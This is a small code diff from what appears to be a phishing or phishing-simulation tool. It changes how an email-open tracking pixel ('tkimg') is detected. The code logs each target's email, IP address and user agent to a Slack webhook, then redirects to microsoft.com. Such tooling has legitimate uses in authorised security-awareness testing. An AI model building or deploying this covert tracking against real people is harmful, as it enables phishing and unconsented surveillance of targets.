@@ -56,7 +56,7 @@ def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
 
         # Get user information from the incoming request
         target_email = base64.b64decode(request.args.get("token")).decode('utf-8').strip()
-        if request.args.get("i") == "true":
+        if request.path.split('/')[-1] == "tkimg":
             notify_slack(config.get("SLACK","WEBHOOK"),"Email Opened",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
             return redirect("https://microsoft.com/", code=302)
 
